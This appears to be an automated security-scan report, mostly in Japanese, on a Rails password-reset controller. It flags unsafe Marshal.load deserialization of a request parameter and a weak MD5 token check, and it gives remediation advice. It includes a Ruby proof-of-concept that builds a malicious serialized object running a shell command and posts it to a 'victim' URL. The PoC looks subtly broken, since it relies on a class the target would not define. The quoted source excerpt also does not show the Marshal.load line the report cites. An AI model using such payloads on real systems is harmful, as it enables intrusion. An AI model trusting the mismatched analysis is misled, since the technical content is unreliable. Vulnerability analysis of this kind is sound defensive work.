# Security Analysis: password_resets_controller.rb - Validates the structure and integrity of password reset tokens

## ファイル情報

- **ファイルパス**: `repo/app/controllers/password_resets_controller.rb`
- **検出パターン**: Validates the structure and integrity of password reset tokens

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 90**

## 脆弱性タイプ

- `RCE`

## PAR Policy Analysis

### Principals (データ源)

- **params[:user]**: Untrusted
  - Context: HTTP request parameters
  - Risk Factors: deserialization_input, untrusted
- **params[:token]**: Untrusted
  - Context: HTTP request parameters
  - Risk Factors: tamperable
- **params[:password]**: Untrusted
  - Context: HTTP request parameters
  - Risk Factors: credential_input
- **params[:confirm_password]**: Untrusted
  - Context: HTTP request parameters
  - Risk Factors: credential_input

### Actions (セキュリティ制御)

- **is_valid?**: Insufficient
  - Function: token_validation
  - Weaknesses: weak_hash, unsafe_deserialization
  - Bypass Vectors: malicious_serialized_object, MD5衝突攻撃

### Resources (操作対象)

- **Marshal.load**: Critical
  - Operation: deserialization
  - Protection: 
- **User.find_by**: High
  - Operation: database_read
  - Protection: ORM
- **user.save!**: High
  - Operation: database_write
  - Protection: ORM, authorization_missing

### Policy Violations

#### DSLRUBY001: Untrusted input passed to unsafe deserialization (Pattern: Validates the structure and integrity of password reset tokens)

- **Path**: PasswordResetsController#reset_password: Marshal.load(Base64.decode64(params[:user]))
- **Severity**: critical
- **Confidence**: 0.90

## マッチしたソースコード

```code
def is_valid?(token)
    if token =~ /(?<user>\d+)-(?<email_hash>[A-Z0-9]{32})/i

      # Fetch the user by their id, and hash their email address
      @user = User.find_by(id: $~[:user])
      email = Digest::MD5.hexdigest(@user.email)

      # Compare and validate our hashes
      return true if email == $~[:email_hash]
    end
  end
```

## 詳細解析

PasswordResetsControllerのreset_passwordアクションで、HTTPリクエストパラメータparams[:user]をBase64→Marshal.loadでデシリアライズしており、攻撃者が任意のオブジェクトを注入・実行可能です。トークン検証(is_valid?)もMD5ベースで弱く、総合的に重大なRCEリスクがあります。

## PoC（概念実証コード）

```text
# PoC: 悪意あるオブジェクトをデシリアライズしRCEを発生
class Evil
  def _dump(level); '' end
  def self._load(data)
    system('touch /tmp/pwned')
    Evil.new
  end
end
payload = Base64.strict_encode64(Marshal.dump(Evil.new))
require 'net/http'; uri = URI('http://victim/app/password_resets/reset_password')
res = Net::HTTP.post_form(uri, 'user' => payload)
puts res.body
```

## 修復ガイダンス

### Deserialization

- **Required**: 安全なシリアライゼーションライブラリ(JSONなど)への切り替え
- **Guidance**: Marshal.loadを禁止し、受信データはJSON.parseなどでホワイトリスト検証を行う
- **Priority**: high

### TokenGeneration

- **Required**: HMAC-SHA256ベースの署名付きトークンへ移行
- **Guidance**: トークンに秘密鍵ベースのHMACを付与し、MD5は廃止する
- **Priority**: medium

### Authentication

- **Required**: skip_before_action :authenticatedの見直し
- **Guidance**: reset_password処理前に適切な認証・認可を再導入し、不正アクセスを防止する
- **Priority**: high

## 解析ノート

・params[:user]で受け取ったBase64文字列をMarshal.loadでデシリアライズ→任意コード実行の危険
・is_valid?はMD5ハッシュ検証のみで脆弱（weak_hash）
・主リソース: Marshal.load（critical）、User.find_by/ save（high）
・ルール: DSLRUBY001 “Unsafe deserialization of untrusted input”
・改修: JSON化＋ホワイトリスト／HMAC付きトークン／認証強化が必須
・PoC: Evilクラスをデシリアライズして /tmp/pwned を作成するコード例

